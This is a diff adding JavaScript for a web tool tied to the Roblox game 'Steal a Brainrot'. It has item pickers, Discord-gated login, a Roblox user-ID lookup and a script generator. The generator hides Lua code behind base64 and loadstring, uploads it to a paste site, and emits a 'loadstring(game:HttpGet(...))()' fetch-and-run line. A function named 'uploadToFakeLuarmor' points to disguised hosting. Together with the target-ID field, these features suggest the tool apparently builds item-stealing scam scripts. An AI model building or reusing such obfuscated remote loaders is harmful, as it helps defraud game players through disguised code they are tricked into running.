+  "Cyber": "https://static.wikia.nocookie.net/stealabr/images/9/9c/Cyber_Base_Skin_Icon.png/revision/latest/scale-to-width-down/204?cb=20260720040021",
+  "Diamond": "https://static.wikia.nocookie.net/stealabr/images/b/be/Diamond_Base_Skin_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040021",
+  "Divine": "https://static.wikia.nocookie.net/stealabr/images/e/e9/Divine_Base_Skin_Icon.png/revision/latest/scale-to-width-down/204?cb=20260720040021",
+  "Easter": "https://cdn.nookazon.com/128x128/stealabrainrot/items/45acaa91e21629d0.png",
+  "Galaxy": "https://static.wikia.nocookie.net/stealabr/images/2/27/Galaxy_Base_Skin_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040022",
+  "Gingerbread": "https://cdn.nookazon.com/128x128/stealabrainrot/items/94916b077d30a800.png",
+  "Gold": "https://static.wikia.nocookie.net/stealabr/images/5/55/Gold_Base_Skin_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040022",
+  "Halloween": "https://cdn.nookazon.com/128x128/stealabrainrot/items/79021cd015b5364a.png",
+  "Honey Bee Base": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d7fecbe0c23272fb.png",
+  "Lava": "https://static.wikia.nocookie.net/stealabr/images/2/20/Lava_Base_Skin_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040023",
+  "Lucky": "https://cdn.nookazon.com/128x128/stealabrainrot/items/2c500494906cb2ea.png",
+  "Octo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/f3bc8b7b4d8893fd.png",
+  "Pot of Gold": "https://cdn.nookazon.com/128x128/stealabrainrot/items/cf7c954ba6aacc94.png",
+  "Radioactive": "https://static.wikia.nocookie.net/stealabr/images/d/d7/Radioactive_Base_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040025",
+  "Rainbow": "https://static.wikia.nocookie.net/stealabr/images/0/09/Rainbow_Base.gif/revision/latest/scale-to-width-down/180?cb=20260725161834",
+  "Rose": "https://cdn.nookazon.com/128x128/stealabrainrot/items/0e4d41e6b2a0d3ce.png",
+  "Summer": "https://cdn.nookazon.com/128x128/stealabrainrot/items/ef182fc91ec97071.png",
+  "Taco": "https://cdn.nookazon.com/128x128/stealabrainrot/items/a31dd49332c4a474.png",
+  "Valentines": "https://cdn.nookazon.com/128x128/stealabrainrot/items/0fc0d45ddc7be7c8.png",
+  "Yin Yang": "https://static.wikia.nocookie.net/stealabr/images/6/60/Yin_Yang_Base_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040025",
+  "Tralala": "https://cdn.nookazon.com/128x128/stealabrainrot/items/b8b52b392eec4862.png",
+  "Tralalero": "https://cdn.nookazon.com/128x128/stealabrainrot/items/b8b52b392eec4862.png",
+  "Reaper": "https://cdn.nookazon.com/128x128/stealabrainrot/items/39c78f2f01dd6c2f.png"
+}
+const GEAR_IMAGES = {
+  "Alien Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/bfce6ce1c233952e.png",
+  "Flying Bee": "https://storage.beee.pro/game_items/94534/OingtpEIl1tEDsGKj1sRD6JL3jj2Ca6iiQaDIiZF.png",
+  "Crystal Hammer": "https://storage.beee.pro/game_items/93417/pwbSnmNWBJs78r7ZfH4Ok8GoxfF2rYbKvVLRfuYh.com/180DAY-8a10d670971ced9371a6eb86d9f5fed1/420/420/Image/Webp/noFilter",
+  "Blackhole Bomb": "https://cdn.nookazon.com/128x128/stealabrainrot/items/82c3aa5d44e0ad2e.png",
+  "Bloodmoon Hammer": "https://cdn.nookazon.com/128x128/stealabrainrot/items/4e646e56c3113d07.png",
+  "Bloodmoon Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/52ed4783f417f645.png",
+  "Candy Sentry": "https://cdn.nookazon.com/128x128/stealabrainrot/items/1f1b8b2e9cc55c7d.png",
+  "Candy Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/70acd410d37ec5e0.png",
+  "Cupid's Wings": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGpcNBBYQcgxR68dNpw2M2d32n7h6e_YZMufdYB-DPLGtdrPR6fKHbBd4&s=10",
+  "Cursed Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/89fc8066ce179527.png",
+  "Cyber Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/642141fde2fb2a94.png",
+  "Demon's Head": "https://www.picclickimg.com/pt0AAeSwQZpqMlfa/Demons-Head-%93-Gear-%F0%9F%88-Steal-a-Brainrot.webp",
+  "Divine Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/840f652f6eb93ee3.png",
+  "Lava Blaster": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d602e7b2503288fc.png",
+  "Lava Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/bd78566e5ee9e386.png",
+  "Radioactive Airstrike": "https://cdn.nookazon.com/128x128/stealabrainrot/items/b289168cdcfa4f6b.png",
+  "Radioactive Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/2961d3523f92a834.png",
+  "Rainbow Hammer": "https://storage.beee.pro/game_items/85281/WU2tLUljBQ5Uev6jYMjzoAtj12opzInRQLGpj4SR.com/180DAY-7d1c4f1ae91c34ca512541a2452ff7de/420/420/Image/Png/noFilter",
+  "Rainbow Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/4175f27d4cff892c.png",
+  "Santa's Sleigh": "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExcmg0b3g1bG5vYzhuMW16eHZiazIwc3hscGpidW5wNXg2YzBsa2dlNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bKKnwlDkooBvCtjc3Q/giphy.gif",
+  "Waverider": "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDFnOGp0ajRsM2hnb2JjaWtpdXc4dTRma2RybWFsYjR5b3Uxejh5YiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MWQPXmK1OuKdW9nyx9/giphy.gif",
+  "Witch's Broom": "https://cdn.nookazon.com/128x128/stealabrainrot/items/9b7c7552a5d9e054.png",
+  "Yin Yang Lamp": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d77b5a77b7c6ad7b.png",
+  "Yin Yang Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/348937941536040a.png",
+  "Phantom Slap": "https://cdn.nookazon.com/128x128/stealabrainrot/items/217f1dec5574a8d9.png",
+  "Crystal Slap": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHJmA8LnKJYKMRjJdzbq-vqnok_o4Su-ldQFdvEAoRhA&s",
+  "Skeleton Dragon": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmODFTb8MZTFpiv_8nak2Zxwg1L74YFDYP3Go_8lE_kw&s"
+}
+
+// ═══════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════
+let selectedBrainrots=new Set(),selectedGears=new Set(),selectedBases=new Set();
+let currentCategory="all",searchTerm="",gearsSearchTerm="",basesSearchTerm="";
+
+function getImg(type,name){
+  let url="";
+  if(type==="brainrot") url=BRAINROT_IMAGES[name]||"";
+  else if(type==="bases") url=BASE_IMAGES[name]||"";
+  else if(type==="gears") url=GEAR_IMAGES[name]||"";
+  return url;
+}
+function thumbHtml(type,name){
+  const src=getImg(type,name);
+  if(!src) return `<span class="item-thumb-placeholder">🖼️</span>`;
+  return `<img class="item-thumb" src="${src}" alt="${name}" onerror="this.outerHTML='<span class=\\'item-thumb-placeholder\\'>🖼️</span>'">`;
+}
+function getBrainrotMeta(name){ return BRAINROT_ENTRIES.find(e=>e.name===name)||{name,rarity:"Secret",mps:"$0/s"}; }
+
+function parseMpsValue(s){
+  s=String(s||"").toUpperCase().replace(/[$,\s]/g,"").replace("/S","");
+  const m=s.match(/^([\d.]+)([KMBT]?)$/);
+  if(!m)return 0;
+  const mult={T:1e12,B:1e9,M:1e6,K:1e3}[m[2]]||1;
+  return parseFloat(m[1])*mult;
+}
+function parseFilterMin(raw){
+  let s=String(raw||"").toLowerCase().replace(/[$,\s]/g,"").replace("/s","");
+  const m=s.match(/^([\d.]+)\s*([kmbt]?)$/i);
+  if(!m)return null;
+  const mult={"t":1e12,"b":1e9,"m":1e6,"k":1e3,"":1e6}[(m[2]||"").toLowerCase()]||1e6;
+  return parseFloat(m[1])*mult;
+}
+
+function getFilteredBrainrots(){
+  let list=BRAINROT_ENTRIES;
+  if(currentCategory==="OG") list=list.filter(b=>b.rarity==="OG");
+  else if(currentCategory==="Secret") list=list.filter(b=>b.rarity==="Secret");
+  if(searchTerm) list=list.filter(b=>b.name.toLowerCase().includes(searchTerm)||(b.mps&&b.mps.toLowerCase().includes(searchTerm)));
+  return list;
+}
+
+function renderList(type){
+  if(type==="brainrot"){
+    const filtered=getFilteredBrainrots();
+    const c=document.getElementById("brList");
+    if(!filtered.length){c.innerHTML='<div class="empty-list">—</div>';return;}
+    c.innerHTML=filtered.map(e=>{
+      const isSel=selectedBrainrots.has(e.name);
+      return `<div class="br-item ${isSel?"sel":""}" data-name="${e.name}"><div class="br-chk">${isSel?"✓":""}</div>${thumbHtml("brainrot",e.name)}<div class="br-name">${e.name}</div><div class="br-mps">${e.mps}</div><div class="br-rarity rarity-${e.rarity}">${e.rarity}</div></div>`;
+    }).join("");
+    c.querySelectorAll(".br-item").forEach(item=>{
+      item.onclick=e=>{e.stopPropagation();const n=item.dataset.name;if(selectedBrainrots.has(n))selectedBrainrots.delete(n);else selectedBrainrots.add(n);renderList("brainrot");renderTags("brainrot");updateButtonState();saveState();};
+    });
+    return;
+  }
+  let filtered,selected,containerId;
+  if(type==="gears"){filtered=ALL_GEARS.filter(b=>!gearsSearchTerm||b.toLowerCase().includes(gearsSearchTerm));selected=selectedGears;containerId="gearsList";}
+  else{filtered=ALL_BASES.filter(b=>!basesSearchTerm||b.toLowerCase().includes(basesSearchTerm));selected=selectedBases;containerId="basesList";}
+  const c=document.getElementById(containerId);
+  if(!filtered.length){c.innerHTML='<div class="empty-list">—</div>';return;}
+  c.innerHTML=filtered.map(b=>`<div class="br-item ${selected.has(b)?"sel":""}" data-name="${b}"><div class="br-chk">${selected.has(b)?"✓":""}</div>${thumbHtml(type,b)}<div class="br-name">${b}</div></div>`).join("");
+  c.querySelectorAll(".br-item").forEach(item=>{
+    item.onclick=e=>{e.stopPropagation();const n=item.dataset.name;if(selected.has(n))selected.delete(n);else selected.add(n);renderList(type);renderTags(type);updateButtonState();saveState();};
+  });
+}
+
+function renderTags(type){
+  let selected,countId,tagsId,phKey;
+  if(type==="brainrot"){selected=selectedBrainrots;countId="brCount";tagsId="brTags";phKey="selectBrainrots";}
+  else if(type==="gears"){selected=selectedGears;countId="gearsCount";tagsId="gearsTags";phKey="selectGears";}
+  else{selected=selectedBases;countId="basesCount";tagsId="basesTags";phKey="selectBases";}
+  const arr=Array.from(selected);
+  document.getElementById(countId).textContent=arr.length?`${arr.length} ${t("selected")}`:t(phKey);
+  const c=document.getElementById(tagsId);
+  c.innerHTML=arr.map(name=>{
+    const img=getImg(type,name);
+    const metaLabel=type==="brainrot"?` (${getBrainrotMeta(name).mps})`:"";
+    const lbl=`${name}${metaLabel}`;
+    return `<span class="tag">${img?`<img src="${img}" alt="${name}">`:""}${lbl.length>28?lbl.slice(0,26)+"...":lbl}<button data-rm="${name}" type="button">×</button></span>`;
+  }).join("");
+  c.querySelectorAll("button").forEach(btn=>{
+    btn.onclick=e=>{e.stopPropagation();selected.delete(btn.dataset.rm);renderTags(type);renderList(type);updateButtonState();saveState();};
+  });
+}
+
+function updateButtonState(){
+  const targetId=document.getElementById("targetId").value.trim();
+  const btn=document.getElementById("generateBtn");
+  const hasAny=selectedBrainrots.size||selectedGears.size||selectedBases.size;
+  if(!userInRequiredServer){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genServer");}
+  else if(!hasAny){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genWarn");}
+  else if(!targetId){btn.disabled=true;btn.classList.add("disabled");btn.textContent=t("genId");}
+  else{btn.disabled=false;btn.classList.remove("disabled");btn.textContent=t("genOk");}
+}
+
+// ═══════════════════════════════════════════════════
+// AUTO-SAVE
+// ═══════════════════════════════════════════════════
+function saveState(){
+  if(!currentDiscordUserId||!autoSaveEnabled)return;
+  try{localStorage.setItem(`wxnad_state_${currentDiscordUserId}`,JSON.stringify({
+    targetUser:document.getElementById("targetUser").value,
+    targetId:document.getElementById("targetId").value,
+    brainrots:Array.from(selectedBrainrots),gears:Array.from(selectedGears),bases:Array.from(selectedBases)
+  }));}catch{}
+}
+function loadState(userId){
+  if(!autoSaveEnabled)return;
+  try{
+    const raw=localStorage.getItem(`wxnad_state_${userId}`);
+    if(!raw)return;
+    const s=JSON.parse(raw);
+    document.getElementById("targetUser").value=s.targetUser||"";
+    document.getElementById("targetId").value=s.targetId||"";
+    selectedBrainrots=new Set(s.brainrots||[]);selectedGears=new Set(s.gears||[]);selectedBases=new Set(s.bases||[]);
+    renderList("brainrot");renderTags("brainrot");renderList("gears");renderTags("gears");renderList("bases");renderTags("bases");
+    updateButtonState();
+  }catch{}
+}
+
+// ═══════════════════════════════════════════════════
+// SCRIPT HISTORY
+// ═══════════════════════════════════════════════════
+function getHistoryKey(){return `wxnad_history_${currentDiscordUserId||"guest"}`;}
+function loadHistory(){try{const r=localStorage.getItem(getHistoryKey());return r?JSON.parse(r):[];}catch{return[];}}
+function saveHistory(list){try{localStorage.setItem(getHistoryKey(),JSON.stringify(list.slice(0,50)));}catch{}}
+function addToHistory(script){
+  if(!script||!currentDiscordUserId)return;
+  const list=loadHistory();
+  list.unshift({id:Date.now().toString(36)+Math.random().toString(36).slice(2,7),date:new Date().toISOString(),script:String(script),targetId:(document.getElementById("targetId")||{}).value||"",targetUser:(document.getElementById("targetUser")||{}).value||"",mode:scriptMode});
+  saveHistory(list);
+}
+function renderHistory(){
+  const listEl=document.getElementById("historyList");
+  if(!listEl)return;
+  const list=loadHistory();
+  if(!list.length){listEl.innerHTML=`<div class="history-empty">${t("historyEmpty")}</div>`;return;}
+  listEl.innerHTML=list.map(item=>{
+    const meta=[item.targetUser||item.targetId||t("noTarget"),item.mode||""].filter(Boolean).join(" · ");
+    const preview=(item.script||"").slice(0,90).replace(/</g,"&lt;");
+    return `<div class="history-item" data-id="${item.id}">
+      <div class="history-item-top">
+        <span class="history-date">${new Date(item.date).toLocaleString()}</span>
+        <div class="history-actions">
+          <button data-act="copy">${t("copy")}</button>
+          <button data-act="use">${t("use")}</button>
+          <button data-act="del">${t("del")}</button>
+        </div>
+      </div>
+      <div class="history-meta">${meta}</div>
+      <div class="history-meta">${preview}${(item.script||"").length>90?"…":""}</div>
+    </div>`;
+  }).join("");
+}
+
+document.getElementById("historyList").onclick=e=>{
+  const btn=e.target.closest("button[data-act]");
+  if(!btn)return;
+  const item=btn.closest(".history-item");
+  if(!item)return;
+  const id=item.dataset.id,list=loadHistory(),entry=list.find(x=>x.id===id);
+  if(!entry)return;
+  if(btn.dataset.act==="copy"){navigator.clipboard.writeText(entry.script||"");showToast(t("toastCopied"));}
+  else if(btn.dataset.act==="use"){document.getElementById("scriptOutput").textContent=entry.script||"";document.getElementById("result").classList.add("show");document.getElementById("historyModal").classList.remove("open");showToast(t("toastLoaded"));}
+  else if(btn.dataset.act==="del"){saveHistory(list.filter(x=>x.id!==id));renderHistory();showToast(t("toastDeleted"));}
+};
+document.getElementById("historyCloseBtn").onclick=()=>document.getElementById("historyModal").classList.remove("open");
+document.getElementById("historyModal").onclick=e=>{if(e.target.id==="historyModal")document.getElementById("historyModal").classList.remove("open");};
+document.getElementById("scriptsHistoryOption").onclick=e=>{e.stopPropagation();renderHistory();document.getElementById("historyModal").classList.add("open");document.getElementById("userMenu").classList.remove("open");};
+
+// ═══════════════════════════════════════════════════
+// DISCORD AUTH
+// ═══════════════════════════════════════════════════
+function getDiscordAvatar(user){
+  if(user.avatar){const ext=user.avatar.startsWith("a_")?"gif":"png";return`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;}
+  return`https://cdn.discordapp.com/embed/avatars/${Number((BigInt(user.id)>>22n)%6n)}.png`;
+}
+function setAuthUser(user){
+  localStorage.setItem("wxnad_discord_user",JSON.stringify(user));
+  userInRequiredServer=user&&user.inServer===true;
+  document.getElementById("userAvatar").src=getDiscordAvatar(user);
+  document.getElementById("userName").textContent=user.global_name||user.username;
+  currentDiscordUserId=String(user.id);
+  const pref=localStorage.getItem(`wxnad_autosave_${currentDiscordUserId}`);
+  autoSaveEnabled=pref===null?true:pref==="true";
+
+  if(!userInRequiredServer){
+    // No está en el server: mostrar el gate con el banner de unirse
+    document.getElementById("discordAuthGate").classList.remove("hidden");
+    document.getElementById("joinServerBanner").style.display="block";
+     document.getElementById("joinServerBtn").style.display="flex";
+    document.getElementById("discordLoginBtn").style.display="none";
+    const statusEl=document.getElementById("authStatus");
+    statusEl.style.color="#f87171";
+    statusEl.textContent="No estás en el servidor requerido.";
+    // Limpiar sesión guardada para forzar re-login tras unirse
+    localStorage.removeItem("wxnad_discord_user");
+    return;
+  }
+
+  document.getElementById("userPill").classList.add("show");
+  document.getElementById("discordAuthGate").classList.add("hidden");
+  document.getElementById("joinServerBanner").style.display="none";
+   document.getElementById("joinServerBtn").style.display="none";
+  document.getElementById("discordLoginBtn").style.display="flex";
+  updateAutoSaveBadge();
+  loadState(currentDiscordUserId);
+  updateButtonState();
+}
+function logoutDiscord(){
+  saveState();
+  currentDiscordUserId=null;userInRequiredServer=false;
+  document.getElementById("userMenu").classList.remove("open");
+  localStorage.removeItem("wxnad_discord_user");
+  document.getElementById("userPill").classList.remove("show");
+  document.getElementById("discordAuthGate").classList.remove("hidden");
+  document.getElementById("joinServerBanner").style.display="none";
+   document.getElementById("joinServerBtn").style.display="none";
+  document.getElementById("discordLoginBtn").style.display="flex";
+  document.getElementById("authStatus").textContent="";
+  updateButtonState();
+}
+function updateAutoSaveBadge(){
+  const badge=document.getElementById("autoSaveBadge");
+  if(!badge)return;
+  badge.textContent=autoSaveEnabled?"ON":"OFF";
+  badge.classList.toggle("off",!autoSaveEnabled);
+}
+
+document.getElementById("userPill").onclick=e=>{if(e.target.closest("#logoutBtn"))return;e.stopPropagation();document.getElementById("userMenu").classList.toggle("open");};
+document.getElementById("logoutBtn").onclick=logoutDiscord;
+document.getElementById("autoSaveOption").onclick=e=>{
+  e.stopPropagation();autoSaveEnabled=!autoSaveEnabled;
+  if(currentDiscordUserId)localStorage.setItem(`wxnad_autosave_${currentDiscordUserId}`,String(autoSaveEnabled));
+  if(autoSaveEnabled){saveState();showToast(t("toastAutoOn"));}else showToast(t("toastAutoOff"));
+  updateAutoSaveBadge();
+};
+document.addEventListener("click",e=>{
+  if(!e.target.closest("#userPill")&&!e.target.closest("#userMenu"))document.getElementById("userMenu").classList.remove("open");
+  if(!e.target.closest("#langBtn")&&!e.target.closest("#langMenu"))document.getElementById("langMenu").classList.remove("open");
+});
+
+async function initAuth(){
+  const imgEl=document.getElementById("authCustomImg"),iconEl=document.getElementById("authDefaultIcon");
+  if(DISCORD_GATE_IMAGE_URL){imgEl.src=DISCORD_GATE_IMAGE_URL;imgEl.classList.add("show");iconEl.style.display="none";}
+
+  const params=new URLSearchParams(window.location.search);
+  const code=params.get("code"),state=params.get("state"),err=params.get("error");
+  if(err){window.history.replaceState({},document.title,DISCORD_REDIRECT_URI);document.getElementById("authStatus").textContent="Autenticación cancelada.";return;}
+
+  if(code){
+    const savedState=sessionStorage.getItem("discord_oauth_state");
+    window.history.replaceState({},document.title,DISCORD_REDIRECT_URI);
+    if(state&&savedState&&state!==savedState){document.getElementById("authStatus").textContent="Error de seguridad. Intenta de nuevo.";return;}
+    const loginBtn=document.getElementById("discordLoginBtn"),statusEl=document.getElementById("authStatus");
+    loginBtn.disabled=true;statusEl.style.color="#facc15";statusEl.textContent="Verificando sesión...";
+    try{
+      const res=await fetch("/api/auth",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code,redirectUri:DISCORD_REDIRECT_URI})});
+      const data=await res.json();
+      if(!res.ok||!data.id)throw new Error(data.error||"Error al validar");
+      setAuthUser(data);return;
+    }catch(e){loginBtn.disabled=false;statusEl.style.color="#f87171";statusEl.textContent="Error: "+e.message;return;}
+  }
+
+  const stored=localStorage.getItem("wxnad_discord_user");
+  if(stored){try{const u=JSON.parse(stored);if(u&&u.id){setAuthUser(u);return;}}catch{}}
+  document.getElementById("discordAuthGate").classList.remove("hidden");
+}
+
+document.getElementById("discordLoginBtn").onclick=()=>{
+  window.location.href=DISCORD_AUTH_URL;
+};
+
+// ═══════════════════════════════════════════════════
+// ROBLOX LOOKUP
+// ═══════════════════════════════════════════════════
+let lookupTimer=null,lastAutoFilledId="",lastQueriedUsername="",lookupReqSeq=0;
+const userIdCache=new Map();
+
+function setLookupStatus(msg,type=""){const el=document.getElementById("lookupStatus");if(!el)return;el.textContent=msg;el.className="lookup-status"+(type?" "+type:"");}
+function extractUrlId(raw){const m=raw.match(/roblox\.com\/users\/(\d+)/i);return m?m[1]:null;}
+
+async function fetchRobloxId(username){
+  const clean=username.trim().replace(/^@+/,"");if(!clean)return null;
+  const key=clean.toLowerCase();if(userIdCache.has(key))return userIdCache.get(key);
+  try{
+    const res=await fetch(`/api/roblox/search?username=${encodeURIComponent(clean)}`);
+    if(res.status===429)return{rateLimited:true};if(!res.ok)return null;
+    const data=await res.json();
+    const id=data.id||data.userId||data.Id||(data.data&&(data.data.id||data.data.userId));
+    const name=data.name||data.username||data.Name||(data.data&&(data.data.name||data.data.username))||clean;
+    if(id){const result={id:String(id),name:String(name)};userIdCache.set(key,result);return result;}
+    return null;
+  }catch{return null;}
+}
+
+async function autoLookup(force=false){
+  const userInput=document.getElementById("targetUser"),idInput=document.getElementById("targetId"),raw=userInput.value.trim();
+  if(!raw){lastQueriedUsername="";if(idInput.value.trim()===lastAutoFilledId){idInput.value="";lastAutoFilledId="";}setLookupStatus("");saveState();return;}
+  const urlId=extractUrlId(raw);
+  if(urlId){lastQueriedUsername=raw;idInput.value=urlId;lastAutoFilledId=urlId;updateButtonState();setLookupStatus(`${t("lookupIdDetected")}: ${urlId}`,"ok");saveState();return;}
+  if(/^\d+$/.test(raw)){lastQueriedUsername=raw;idInput.value=raw;lastAutoFilledId=raw;updateButtonState();setLookupStatus(`${t("lookupIdDetected")}: ${raw}`,"ok");saveState();return;}
+  if(!force){setLookupStatus(t("lookupEnter"),"");return;}
+  const normalized=raw.replace(/^@+/,"").toLowerCase();
+  if(normalized===lastQueriedUsername&&idInput.value.trim())return;
+  const reqId=++lookupReqSeq;setLookupStatus(t("lookupSearching"),"loading");
+  const result=await fetchRobloxId(raw);
+  if(reqId!==lookupReqSeq)return;
+  lastQueriedUsername=normalized;
+  if(result&&result.rateLimited){setLookupStatus(t("lookupRate"),"err");return;}
+  if(result&&result.id){if(!idInput.value.trim()||idInput.value.trim()===lastAutoFilledId){idInput.value=result.id;lastAutoFilledId=result.id;updateButtonState();}setLookupStatus(`${t("lookupFound")} (${result.name}): ${result.id}`,"ok");saveState();}
+  else{if(idInput.value.trim()===lastAutoFilledId){idInput.value="";lastAutoFilledId="";}setLookupStatus(t("lookupNotFound"),"err");}
+}
+
+document.getElementById("targetUser").addEventListener("input",()=>{
+  clearTimeout(lookupTimer);saveState();
+  const raw=document.getElementById("targetUser").value.trim();
+  if(!raw||extractUrlId(raw)||/^\d+$/.test(raw)){autoLookup(true);return;}
+  setLookupStatus(t("lookupSearchingShort"),"loading");
+  lookupTimer=setTimeout(()=>autoLookup(true),800);
+});
+document.getElementById("targetUser").addEventListener("keydown",e=>{if(e.key==="Enter"){e.preventDefault();clearTimeout(lookupTimer);autoLookup(true);}});
+document.getElementById("targetUser").addEventListener("blur",()=>{clearTimeout(lookupTimer);lookupTimer=setTimeout(()=>autoLookup(true),250);});
+document.getElementById("targetId").oninput=()=>{lastAutoFilledId="";updateButtonState();saveState();};
+
+// ═══════════════════════════════════════════════════
+// DROPDOWNS + BUTTONS
+// ═══════════════════════════════════════════════════
+document.querySelectorAll(".cat-btn").forEach(btn=>{btn.onclick=()=>{document.querySelectorAll(".cat-btn").forEach(b=>b.classList.remove("active"));btn.classList.add("active");currentCategory=btn.dataset.cat;renderList("brainrot");};});
+document.getElementById("brSearch").oninput=e=>{searchTerm=e.target.value.toLowerCase();renderList("brainrot");};
+document.getElementById("gearsSearch").oninput=e=>{gearsSearchTerm=e.target.value.toLowerCase();renderList("gears");};
+document.getElementById("basesSearch").oninput=e=>{basesSearchTerm=e.target.value.toLowerCase();renderList("bases");};
+[["brToggle","brDropdown"],["gearsToggle","gearsDropdown"],["basesToggle","basesDropdown"]].forEach(([a,b])=>{document.getElementById(a).onclick=()=>document.getElementById(b).classList.toggle("open");});
+document.getElementById("doneBtn").onclick=()=>document.getElementById("brDropdown").classList.remove("open");
+document.getElementById("gearsDoneBtn").onclick=()=>document.getElementById("gearsDropdown").classList.remove("open");
+document.getElementById("basesDoneBtn").onclick=()=>document.getElementById("basesDropdown").classList.remove("open");
+document.addEventListener("click",e=>{
+  if(!e.target.closest("#brToggle")&&!e.target.closest("#brDropdown"))document.getElementById("brDropdown").classList.remove("open");
+  if(!e.target.closest("#gearsToggle")&&!e.target.closest("#gearsDropdown"))document.getElementById("gearsDropdown").classList.remove("open");
+  if(!e.target.closest("#basesToggle")&&!e.target.closest("#basesDropdown"))document.getElementById("basesDropdown").classList.remove("open");
+});
+document.getElementById("selectAllBtn").onclick=()=>{getFilteredBrainrots().forEach(e=>selectedBrainrots.add(e.name));renderList("brainrot");renderTags("brainrot");updateButtonState();saveState();};
+document.getElementById("deselectAllBtn").onclick=()=>{getFilteredBrainrots().forEach(e=>selectedBrainrots.delete(e.name));renderList("brainrot");renderTags("brainrot");updateButtonState();saveState();};
+document.getElementById("gearsSelectAllBtn").onclick=()=>{ALL_GEARS.forEach(b=>selectedGears.add(b));renderList("gears");renderTags("gears");updateButtonState();saveState();};
+document.getElementById("gearsDeselectAllBtn").onclick=()=>{ALL_GEARS.forEach(b=>selectedGears.delete(b));renderList("gears");renderTags("gears");updateButtonState();saveState();};
+document.getElementById("basesSelectAllBtn").onclick=()=>{ALL_BASES.forEach(b=>selectedBases.add(b));renderList("bases");renderTags("bases");updateButtonState();saveState();};
+document.getElementById("basesDeselectAllBtn").onclick=()=>{ALL_BASES.forEach(b=>selectedBases.delete(b));renderList("bases");renderTags("bases");updateButtonState();saveState();};
+
+document.getElementById("mpsFilterBtn").onclick=applyMpsFilter;
+document.getElementById("mpsFilter").addEventListener("keydown",e=>{if(e.key==="Enter"){e.preventDefault();applyMpsFilter();}});
+function applyMpsFilter(){
+  const raw=(document.getElementById("mpsFilter")||{}).value||"";
+  const minVal=parseFilterMin(raw);
+  if(minVal===null){showToast(t("toastMpsInvalid"));return;}
+  let count=0;
+  BRAINROT_ENTRIES.forEach(entry=>{if(parseMpsValue(entry.mps)>=minVal){selectedBrainrots.add(entry.name);count++;}});
+  renderList("brainrot");renderTags("brainrot");updateButtonState();saveState();
+  showToast(`✅ ${count} ${t("toastMpsApplied")}`);
+}
+
+// MODE
+document.querySelectorAll(".mode-btn").forEach(btn=>{
+  btn.onclick=()=>{
+    document.querySelectorAll(".mode-btn").forEach(b=>b.classList.remove("active"));btn.classList.add("active");
+    scriptMode=btn.dataset.mode;
+    document.getElementById("modeSlider").style.transform=`translateX(${btn.dataset.index*100}%)`;
+    document.getElementById("customArea").style.display=scriptMode==="CUSTOM"?"block":"none";
+    saveState();
+  };
+});
+
+// ═══════════════════════════════════════════════════
+// GENERATE SCRIPT
+// ═══════════════════════════════════════════════════
+function formatLuaTable(setObj){
+  const arr=Array.from(setObj).map(n=>`    ["${n}"] = true`);
+  return arr.length?arr.join(",\n")+"\n":"";
+}
+function obfuscateBase64(code){
+  const encoded=btoa(unescape(encodeURIComponent(code)));
+  return `--[[ BASE64 ENCODED ]]\nlocal b64 = "${encoded}"\nlocal function decode(data)\n    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n    data = string.gsub(data, '[^'..b..'=]', '')\n    return (data:gsub('.', function(x)\n        if (x == '=') then return '' end\n        local r,f='',(b:find(x)-1)\n        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end\n        return r\n    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)\n        if (#x ~= 8) then return '' end\n        local c=0\n        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end\n        return string.char(c)\n    end))\nend\nreturn (loadstring or load)(decode(b64))()`;
+}
+async function uploadToPastefy(script){
+  const res=await fetch("https://pastefy.app/api/v2/paste",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+PASTEFY_API_KEY},body:JSON.stringify({title:"Script.lua",content:script,visibility:"UNLISTED",encrypted:false,type:"PASTE"})});
+  const text=await res.text();if(!res.ok)throw new Error("HTTP "+res.status);
+  const data=JSON.parse(text);const paste=data.paste||data;if(!paste||!paste.id)throw new Error("No ID");
+  return `loadstring(game:HttpGet("${paste.raw_url||("https://pastefy.app/"+paste.id+"/raw")}"))()`
+}
+async function uploadToFakeLuarmor(script){
+  const endpoint="https://c--4186a218-4132-4ab7-983b-e7bc40853ae7-prod.lovable.cloud/rest/v1/scripts?select=id";
